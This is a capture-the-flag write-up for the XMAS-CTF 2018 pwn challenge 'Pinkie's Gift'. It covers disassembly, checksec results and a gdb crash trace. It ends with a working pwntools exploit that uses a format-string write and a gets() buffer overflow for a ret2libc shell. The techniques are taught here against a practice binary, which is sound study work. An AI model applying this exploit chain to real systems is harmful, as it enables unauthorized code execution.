# __XMAS-CTF 2018__ 
## _Pinkie's Gift_

## Information
**Category:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Description:** 

> In this challenge, Santa Pie will give you some unusual gifts. See if you can use this wisdom to get the flag before Christmas.
>
> [pinkiegift.dms](pinkiegift.dms) 
>
> Author: PinkiePie1189

**Flag:**

> X-MAS{F0rm47_57r1ng_15_7h3_b3st_pr353n7_f0r_l1773_buff3r_0v3rfl0w}

## Solution

After doing an initial static analysis to have a better understanding of what we are going to face. We identified a few really interesting things:

![](/images/XMAS-CTF-2018/PinkiesGift/01.png)

1. Santa gave us a very generous gift. The addresses to the binsh variable and system!

```
0x080485a7 <+97>:	mov    eax,DWORD PTR [ebx-0x10]
0x080485ad <+103>:	push   eax
0x080485ae <+104>:	mov    eax,0x8049940
0x080485b4 <+110>:	push   eax
0x080485b5 <+111>:	lea    eax,[ebx-0x1254]
0x080485bb <+117>:	push   eax
0x080485bc <+118>:	call   0x80483c0 <printf@plt>
```

**`printf` arguments:**
```
arg[0]: 0x8048690 ; "Here are some gifts from Santa: %p %p\n"
arg[1]: 0x8049940 ; binsh variable
arg[2]: 0xf7e3de80 ; <system>

[f2tc@htejeda pinkiegift]$ readelf -s ./pinkiegift.dms | grep 8049940
    54: 08049940   100 OBJECT  GLOBAL DEFAULT   25 binsh
```

2. The printf(buf) after fgets(buf, 128, stdin) is vulnerable to format string

3. The use of the vulnerable function `gets(buf)`

---

#### Security properties of the executable:
```
[f2tc@htejeda pinkiegift]$ checksec pinkiegift.dms 
[*] '/home/f2tc/xmas-ctf/pwn/pinkiegift/pinkiegift.dms'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Since NX is the only protection and Santa already gave us the addresses to system and binsh, our strategy is the following:

1. Take advantage of the Format String vulneraiblity to alter the value of binsh variable with "/bin/sh"
2. Overflow gets(buf) and use ret2libc: `system(binsh)`

#### Format String
```
[f2tc@htejeda pinkiegift]$ ./pinkiegift.dms 
Here are some gifts from Santa: 0x8049940 0xf75e6e80
AAAA%08x
AAAA41414141
```
_**Important:** buf is the 1st argument, no previous characters are printed_

#### Buffer Overflow

```
0x080485f0 <+170>:	lea    eax,[ebp-0x84]
0x080485f6 <+176>:	push   eax
0x080485f7 <+177>:	call   0x80483d0 <gets@plt>
```

**Buffer** | **SFP** | **EIP**
--- | --- | ---
`"A" * 132` | `"A"*4` | BBBB

```
gdb-peda$ r < <(python -c 'print "FMTSTR\n"+ "A"*136 + "BBBB"')
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad208b 
EDX: 0xf7fc78a4 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd480 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd480 --> 0x0 
0004| 0xffffd484 --> 0xffffd514 --> 0xffffd643 ("/home/f2tc/xmas-ctf/pwn/pinkiegift/./pinkiegift.dms")
0008| 0xffffd488 --> 0xffffd51c --> 0xffffd66f ("XDG_SESSION_ID=2163")
0012| 0xffffd48c --> 0xf7fd86c0 --> 0x80482de ("GLIBC_2.0")
0016| 0xffffd490 --> 0x1 
0020| 0xffffd494 --> 0x1 
0024| 0xffffd498 --> 0x0 
0028| 0xffffd49c --> 0x8049900 --> 0xf7e190c0 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

## Exploit

```python
import sys
from pwn import *
from libformatstr import FormatStr

p = process('./pinkiegift.dms')
gift   = p.recv().split(' ')
binsh  = int(gift[6], 16)
system = int(gift[7], 16)

print "Stage 1"
fmt = FormatStr()
fmt[binsh] = "/bin/sh"
p.sendline(fmt.payload(1, 0))
stage1 = p.recv()

print "Stage 2"
stage2  = "A"*136
stage2 += p32(system)
stage2 += "PADD"
stage2 += p32(binsh)

p.sendline(stage2)
p.recv()

p.interactive()
```

```
[f2tc@htejeda pinkiegift]$ ./exploit.py 
$ cat flag
X-MAS{F0rm47_57r1ng_15_7h3_b3st_pr353n7_f0r_l1773_buff3r_0v3rfl0w}
```